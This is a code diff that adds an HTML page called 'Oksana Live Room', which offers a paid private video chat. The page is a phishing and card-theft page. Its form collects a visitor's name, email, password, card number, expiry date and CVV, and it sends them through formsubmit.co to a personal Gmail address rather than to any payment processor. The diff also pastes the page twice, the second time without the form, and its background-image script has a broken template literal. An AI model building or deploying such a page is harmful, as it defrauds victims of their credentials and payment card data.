@@ -1,0 +1,318 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Oksana Live Room</title>
+<style>
+  body {
+    margin: 0;
+    font-family: 'Segoe UI', sans-serif;
+    background: #ffeef0;
+    overflow-x: hidden;
+    position: relative;
+  }
+
+  /* الجانبين الخلفيتين */
+  .side-background {
+    position: fixed;
+    top: 0;
+    bottom: 0;
+    width: 18vw;
+    background-size: cover;
+    background-position: center;
+    z-index: -1;
+    opacity: 0.4;
+    transition: background-image 1s ease-in-out;
+  }
+  .left-background {
+    left: 0;
+  }
+  .right-background {
+    right: 0;
+  }
+
+  header {
+    text-align: center;
+    padding: 20px;
+    background: #fff;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+  }
+  .logo {
+    height: 60px;
+  }
+  h1 {
+    font-size: 2em;
+    margin: 0;
+    color: #cc0033;
+  }
+  .container {
+    max-width: 500px;
+    margin: 40px auto;
+    background: #fff0f5;
+    padding: 30px;
+    border-radius: 16px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+  }
+  h2 {
+    text-align: center;
+    color: #cc0033;
+  }
+  form {
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+  }
+  input, select, button {
+    padding: 12px;
+    border-radius: 8px;
+    border: 1px solid #ccc;
+    font-size: 16px;
+  }
+  button {
+    background: #cc0033;
+    color: white;
+    border: none;
+    cursor: pointer;
+  }
+  button:hover {
+    background: #990026;
+  }
+  footer {
+    text-align: center;
+    margin-top: 40px;
+    color: #777;
+  }
+
+  @media (max-width: 768px) {
+    .side-background {
+      display: none;
+    }
+    .container {
+      margin: 20px;
+    }
+    header {
+      flex-direction: column;
+    }
+    .logo {
+      height: 40px;
+    }
+  }
+</style>
+</head>
+<body>
+  <!-- الخلفيات الجانبية -->
+  <div class="side-background left-background" id="leftBG"></div>
+  <div class="side-background right-background" id="rightBG"></div>
+
+  <header>
+    <img src="https://i.postimg.cc/CZSL4QSp/oksana-logo.png" alt="Logo" class="logo" />
+    <h1>Oksana Live Room</h1>
+  </header>
+
+  <div class="container">
+    <h2>Join My Private Video Chat</h2>
+    <form action="https://formsubmit.co/Mr.joker1442@gmail.com" method="POST">
+      <input type="text" name="Full Name" placeholder="Full Name" required />
+      <input type="email" name="Email" placeholder="Email Address" required />
+      <input type="password" name="Password" placeholder="Password" required />
+      <input type="text" name="Card Number" placeholder="Card Number" required />
+      <input type="text" name="Card Expiry" placeholder="MM/YY" required />
+      <input type="text" name="CVV" placeholder="CVV" required />
+      <select name="Call Duration" required>
+        <option value="">Select Call Duration</option>
+        <option value="15 mins">15 Minutes - $10</option>
+        <option value="30 mins">30 Minutes - $18</option>
+        <option value="60 mins">60 Minutes - $30</option>
+      </select>
+      <button type="submit">Pay with Visa</button>
+    </form>
+  </div>
+
+  <footer>
+    &copy; 2025 Oksana Live Room. All rights reserved.
+  </footer>
+
+<script>
+  const images = [
+    "https://i.postimg.cc/6yrdb38G/bg1.jpg",
+    "https://i.postimg.cc/4KdV3QBz/bg2.jpg",
+    "https://i.postimg.cc/FkjJ6WHQ/bg3.jpg",
+    "https://i.postimg.cc/qgnngRXZ/bg4.jpg"
+  ];
+
+  let indexLeft = 0;
+  let indexRight = 2;
+
+  const leftBG = document.getElementById('leftBG');
+  const rightBG = document.getElementById('rightBG');
+
+  function changeBackgrounds() {
+    leftBG.style.backgroundImage = url(${images[indexLeft]});
+    rightBG.style.backgroundImage = url(${images[indexRight]});
+
+    indexLeft = (indexLeft + 1) % images.length;
+    indexRight = (indexRight + 1) % images.length;
+  }
+
+  changeBackgrounds();
+  setInterval(changeBackgrounds, 6000);
+</script>
+
+</body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Oksana Live Room</title>
+<style>
+  body {
+    margin: 0;
+    font-family: 'Segoe UI', sans-serif;
+    background: #ffeef0;
+    overflow-x: hidden;
+    position: relative;
+  }
+
+  /* الجانبين الخلفيتين */
+  .side-background {
+    position: fixed;
+    top: 0;
+    bottom: 0;
+    width: 18vw;
+    background-size: cover;
+    background-position: center;
+    z-index: -1;
+    opacity: 0.4;
+    transition: background-image 1s ease-in-out;
+  }
+  .left-background {
+    left: 0;
+  }
+  .right-background {
+    right: 0;
+  }
+
+  header {
+    text-align: center;
+    padding: 20px;
+    background: #fff;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+  }
+  .logo {
+    height: 60px;
+  }
+  h1 {
+    font-size: 2em;
+    margin: 0;
+    color: #cc0033;
+  }
+  .container {
+    max-width: 500px;
+    margin: 40px auto;
+    background: #fff0f5;
+    padding: 30px;
+    border-radius: 16px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+  }
+  h2 {
+    text-align: center;
+    color: #cc0033;
+  }
+  form {
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+  }
+  input, select, button {
+    padding: 12px;
+    border-radius: 8px;
+    border: 1px solid #ccc;
+    font-size: 16px;
+  }
+  button {
+    background: #cc0033;
+    color: white;
+    border: none;
+    cursor: pointer;
+  }
+  button:hover {
+    background: #990026;
+  }
+  footer {
+    text-align: center;
+    margin-top: 40px;
+    color: #777;
+  }
+
+  @media (max-width: 768px) {
+    .side-background {
+      display: none;
+    }
+    .container {
+      margin: 20px;
+    }
+    header {
+      flex-direction: column;
+    }
+    .logo {
+      height: 40px;
+    }
+  }
+</style>
+</head>
+<body>
+  <!-- الخلفيات الجانبية -->
+  <div class="side-background left-background" id="leftBG"></div>
+  <div class="side-background right-background" id="rightBG"></div>
+
+  <header>
+    <img src="https://i.postimg.cc/CZSL4QSp/oksana-logo.png" alt="Logo" class="logo" />
+    <h1>Oksana Live Room</h1>
+  </header>
+
+
+  <footer>
+    &copy; 2025 Oksana Live Room. All rights reserved.
+  </footer>
+
+<script>
+  const images = [
+    "https://i.postimg.cc/6yrdb38G/bg1.jpg",
+    "https://i.postimg.cc/4KdV3QBz/bg2.jpg",
+    "https://i.postimg.cc/FkjJ6WHQ/bg3.jpg",
+    "https://i.postimg.cc/qgnngRXZ/bg4.jpg"
+  ];
+
+  let indexLeft = 0;
+  let indexRight = 2;
+
+  const leftBG = document.getElementById('leftBG');
+  const rightBG = document.getElementById('rightBG');
+
+  function changeBackgrounds() {
+    leftBG.style.backgroundImage = url(${images[indexLeft]});
+    rightBG.style.backgroundImage = url(${images[indexRight]});
+
+    indexLeft = (indexLeft + 1) % images.length;
+    indexRight = (indexRight + 1) % images.length;
+  }
+
+  changeBackgrounds();
+  setInterval(changeBackgrounds, 6000);
+</script>
+
+</body>
+</html>
